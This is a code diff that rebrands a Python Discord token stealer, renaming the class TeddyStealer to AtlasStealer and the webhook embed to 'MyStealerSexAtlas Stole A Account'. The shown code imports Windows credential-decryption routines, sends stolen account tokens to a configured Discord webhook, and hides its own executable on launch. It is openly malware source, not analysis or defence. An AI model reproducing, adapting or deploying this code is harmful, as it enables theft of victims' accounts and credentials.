@@ -1,19 +1,17 @@
-import os, sys, socket, platform, uuid, ctypes, socket, platform, time, requests, os.path, base64, json, threading, string, random, discord, asyncio, httpx, pyautogui, re, http.client, subprocess, shutil, PyInstaller.__main__
+import os
+import sys
+import json
+import uuid
+import ctypes
+import socket
+import random
+import platform
+import requests
 
 from re import findall, match
 from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-from discord_webhook import DiscordWebhook
-from itertools import cycle
-from discord.ext import commands
-from selenium import webdriver
-from datetime import datetime
-from PIL import Image
-from bs4 import BeautifulSoup
-from random import randint
-import emoji as ej
-import lxml
 
 config = {
     'webhook': "WEBHOOK",
@@ -53,7 +51,7 @@ class functions(object):
             return json.dumps(info)
 
 
-class TeddyStealer(functions):
+class AtlasStealer(functions):
     def __init__(self):
         super().__init__()
         self.tokens = []
@@ -74,10 +72,10 @@ class TeddyStealer(functions):
             if "username" in user:
                 if config.get('webhook'):
                     webhook_data = {
-                        "username": "666",
+                        "username": "MyStealerSexAtlas",
                         "embeds": [
                             {
-                                "title": '666 Info',
+                                "title": 'MyStealerSexAtlas Stole A Account',
                                 "color": color,
                                 'fields': [
                                     {
@@ -91,7 +89,7 @@ class TeddyStealer(functions):
                                         "inline": True
                                     },
                                     {   
-                                        "name": "DS Token",
+                                        "name": " Token",
                                         "value": f"||{token}||",
                                         "inline": False
                                     },
@@ -189,4 +187,4 @@ class TeddyStealer(functions):
 if __name__ == "__main__" and os.name == 'nt':
     if config.get('hide_self'):
         ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
-    TeddyStealer()
+    AtlasStealer()
